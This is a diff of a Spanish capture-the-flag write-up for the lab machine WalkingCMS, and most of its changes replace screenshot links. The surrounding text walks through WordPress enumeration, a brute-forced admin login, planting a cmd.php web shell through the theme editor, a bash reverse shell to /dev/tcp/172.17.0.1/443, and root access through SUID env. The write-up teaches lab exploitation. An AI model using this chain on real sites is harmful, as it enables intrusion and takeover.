@@ -31,7 +31,7 @@ Ahora vamos con el reconocimiento de nmap ```nmap -p- --open --min-rate 5000 -sS
 Podemos ver los resultados en el archivo grepeable haciendo ```cat allPorts```, observamos que tan solo está abierto el puerto **80**.
 <br>
 
-![alt text](image.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/50801b43-05e7-4999-91d4-d23412e03e67)
 
 <br>
 <br>
@@ -41,7 +41,7 @@ Podemos ver los resultados en el archivo grepeable haciendo ```cat allPorts```, 
 Al ver que está abierto el puerto 80 nos dirigimos al Navegador Web e introducimos la dirección IP como. podemos ver una página por defecto de Apache2, por lo que haremos un fuzzing para encontrar posible directorios de la siguiente forma: `gobuster dir -w /home/kali/WordLists/directory-medium -u http://172.17.0.2/wordpress -x txt,sql,py,js,php,html`
 <br>
 
-![alt text](image-1.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/8c202d25-653f-4177-a6fe-2344be418e8f)
 
 <br>
 
@@ -51,7 +51,7 @@ Nos reporta que existe un directorio dentro de la web llamado wordpress, por lo 
 Una vez que sabemos que tiene un wordpress, pasaremos a usar la herramienta wp-scan la cual nos permite identificar posible vulnerabilidades a través de plugins, enumeración de usuarios y hacer un ataque de fuerza bruta al panel de login. Para usar dicha herramienta pondremos los siguiente: `wpscan --url http://172.17.0.2/wordpress --enumerate u, pv`, con la cual obtendremos que existe un usuario llamado `mario`:
 <br>
 
-![alt text](image-2.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/96d9d3cc-7e1f-4621-b9f9-cd0ec4350bfe)
 
 <br>
 <br>
@@ -66,14 +66,14 @@ Una vez conocemos el posible usuario haremos un ataque de fuerza bruta al panel 
 Nos reporta lo siguiente: 
 <br>
 
-![alt text](image-3.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/9874aab1-121f-4d9d-91b0-ecd7e24b3f63)
 
 <br>
 
 Ahora volvemos al panel de login que estaría en la siguiente ruta: `http://172.17.0.2/wordpress/wp-admin/`, nos logeamos con las credenciales obtenidas `(mario:love)`. Buscando por el panel de admin una posible forma de acceder a la máquina WalkingCMS observamos que si pinchamos en la parte de `Apariencia > Theme Code Editor` se nos abrirá un edit de código para los temas.
 <br>
 
-![alt text](image-4.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/b0ef60eb-201e-43e4-812e-f7aaaeccc9b8)
 
 <br>
 
@@ -81,35 +81,35 @@ Pinchando en el botón de `Create` de la derecha nos aparecerá el siguiente pop
 
 <br>
 
-![alt text](image-5.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/684232e5-7e9b-4bae-b38f-48f1640beef6)
 
 <br>
 
 Dicho archivo `.php` tendrá el siguiente contenido: 
 <br>
 
-![alt text](image-6.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/563a2366-2256-48c9-818c-a56d2b398b3a)
 
 <br>
 
 Lo que debemos hacer ahora es acceder a dicho archivo a través de la URL, para ello nos iremos a la ruta que nos salía al crear un archivo, que sería `wordpress/wp-content/themes/twentytwentytwo/`:
 <br>
 
-![alt text](image-7.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/741a0428-f358-45f0-b695-c2ae180839fe)
 
 <br>
 
 Y lo que queremos es acceder al archivo de nombre `cmd.php` introduciremos en la URL lo siguiente: `http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/cmd.php`, y listo conseguiremos RCE (Remove Code Execution) pasándole como parámetro el comando que queremos ejecutar en este caso `id`:
 <br>
 
-![alt text](image-8.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/ebca85b8-2f72-4f24-bdd2-90a04be442d1)
 
 <br>
 
 Por lo que ahora nos mandaríamos una [revshell](https://www.revshells.com/), nos ponemos en escucha en un puerto poniendo en la terminal escribiendo lo siguiente `nc -nlvp 443`, y poniendo lo siguiente en el buscador `172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/cmd.php?cmd=bash -c'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'`, y listo recibiríamos la revshell: 
 <br>
 
-![alt text](image-9.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af76da05-55f2-4767-b1a9-15137429dc65)
 
 
 ## Escala de Privilegios
@@ -124,7 +124,7 @@ Antes de empezar a probar como escalar privilegios haremos un sencillo tratamien
 Comprobamos que hemos podido ingresar a la Máquina Víctima como **www-data**, hacemos un `cat /etc/passwd | grep "sh$"` para ver los posibles usuarios: 
 <br>
 
-![alt text](image-10.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/6ba29ccd-363b-4722-a2db-3336b70e3121)
 
 <br>
 
@@ -135,7 +135,7 @@ Si ejecutamos `sudo -l` observamos que no podemos correr nada como sudo, de hech
 `-l` ⮞ listar comandos que podemos ejecutar como sudo(sudoers).
 <br>
 
-![alt text](image-11.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/76c547c0-de2e-4609-9734-fd31077927fa)
 
 <br>
 
@@ -149,22 +149,21 @@ Hacemos la siguiente comprobación para ver la posible escalada ejecutando `find
 Y vemos que tenemos permiso SUID sobre `/usr/bin/env`: 
 <br>
 
-![alt text](image-12.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/3f30a8f4-66fd-4f0e-88f1-db7e0e97d629)
 
 <br>
 
 Por lo que deberíamos hacer ahora es dirigirnos a la página [GTFOBins](https://gtfobins.github.io/) (está página nos indica como elevar privilegios dependiendo del binario que podamos ejecutar), después nos vamos a la parte de SUID de env, y nos encontramos con lo siguiente:
 <br>
 
-![alt text](image-13.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/d3b33fc1-59de-43ba-936e-783c7673af92)
 
 <br>
 
 Por lo que probaremos a ejecutarlo en la máquina víctima poniendo `/usr/bin/env /bin/bash -p`
-
 <br>
 
 Comprobamos que nos ha cambiado el terminal, y listo si ya somos `root` y si hacemos `whoami` para comprobarlo.
 <br>
 
-![alt text](image-14.png)
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/ec54c601-2dd3-4c56-a7a1-b9f481dec655)
